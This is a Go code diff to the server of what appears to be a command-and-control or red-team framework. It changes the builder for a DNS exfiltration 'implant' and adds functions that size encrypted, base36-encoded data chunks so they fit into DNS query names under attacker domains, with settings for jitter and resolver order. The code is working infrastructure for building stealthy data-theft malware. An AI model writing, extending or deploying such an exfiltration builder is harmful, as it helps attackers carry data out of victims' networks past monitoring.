@@ -11,6 +11,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math"
 	"net/http"
 	"os"
 	"os/exec"
@@ -385,16 +386,18 @@ func (api *APIServer) handleBuildExfilClient(w http.ResponseWriter, r *http.Requ
 	// Force the implant to rely on system resolver order
 	req.Resolvers = nil
 
-	// Apply sensible defaults/constraints
-	if req.ChunkBytes <= 0 {
-		req.ChunkBytes = 180
+	beforeChunk, domainLimit := clampExfilChunkBytes(&req)
+	if beforeChunk > 0 && beforeChunk != req.ChunkBytes {
+		if domainLimit > 0 && req.ChunkBytes == domainLimit && beforeChunk > domainLimit {
+			fmt.Printf("[Builder] Requested chunk size %d bytes exceeded DNS limit (%d bytes). Clamped to %d bytes.\n", beforeChunk, domainLimit, req.ChunkBytes)
+		} else {
+			fmt.Printf("[Builder] Normalized chunk size from %d to %d bytes.\n", beforeChunk, req.ChunkBytes)
+		}
+	} else if domainLimit == 0 {
+		fmt.Printf("[Builder] Warning: unable to compute DNS chunk limit for current domains. Retaining %d-byte chunks.\n", req.ChunkBytes)
 	}
-	if req.ChunkBytes < 64 {
-		req.ChunkBytes = 64
-	}
-	if req.ChunkBytes > 220 {
-		req.ChunkBytes = 220
-	}
+
+	// Apply remaining sensible defaults/constraints
 	if req.JitterMinMs <= 0 {
 		req.JitterMinMs = 1500
 	}
@@ -1293,6 +1296,90 @@ func collectActiveDomains(servers []map[string]interface{}) []string {
 		}
 	}
 	return domains
+}
+
+const (
+	dnsMaxName     = 253
+	dataLabelSplit = 62
+	aesGCMOverhead = 28
+	maxChunkProbe  = 512
+)
+
+var log36Of2 = math.Log(2) / math.Log(36)
+
+func clampExfilChunkBytes(req *ExfilClientBuildRequest) (before int, limit int) {
+	const (
+		defaultChunk = 180
+		minChunk     = 64
+		maxChunk     = 220
+	)
+
+	before = req.ChunkBytes
+	if req.ChunkBytes <= 0 {
+		req.ChunkBytes = defaultChunk
+	}
+
+	limit = maxChunkBytesForDomains(req.Domains)
+	if limit > 0 && req.ChunkBytes > limit {
+		req.ChunkBytes = limit
+	}
+
+	if req.ChunkBytes > maxChunk {
+		req.ChunkBytes = maxChunk
+	}
+
+	if (limit == 0 || limit >= minChunk) && req.ChunkBytes < minChunk {
+		req.ChunkBytes = minChunk
+	}
+
+	if req.ChunkBytes < 1 {
+		req.ChunkBytes = 1
+	}
+
+	return before, limit
+}
+
+func maxChunkBytesForDomains(domains []string) int {
+	longest := 0
+	for _, domain := range domains {
+		trimmed := strings.TrimSpace(domain)
+		trimmed = strings.TrimSuffix(trimmed, ".")
+		if l := len(trimmed); l > longest {
+			longest = l
+		}
+	}
+	if dnsMaxName <= longest+1 {
+		return 0
+	}
+	available := dnsMaxName - (longest + 1)
+	best := 0
+	for chunk := 1; chunk <= maxChunkProbe; chunk++ {
+		if nameFitsChunk(chunk, available) {
+			best = chunk
+		} else {
+			break
+		}
+	}
+	return best
+}
+
+func nameFitsChunk(chunkBytes, available int) bool {
+	cipherLen := chunkBytes + aesGCMOverhead
+	encodedLen := estimateBase36Len(cipherLen)
+	labels := (encodedLen + dataLabelSplit - 1) / dataLabelSplit
+	dataLen := encodedLen
+	if labels > 1 {
+		dataLen += labels - 1
+	}
+	return dataLen <= available
+}
+
+func estimateBase36Len(bytes int) int {
+	if bytes <= 0 {
+		return 1
+	}
+	bits := float64(bytes * 8)
+	return int(math.Ceil(bits * log36Of2))
 }
 
 func selectServerAddress(servers []map[string]interface{}) string {
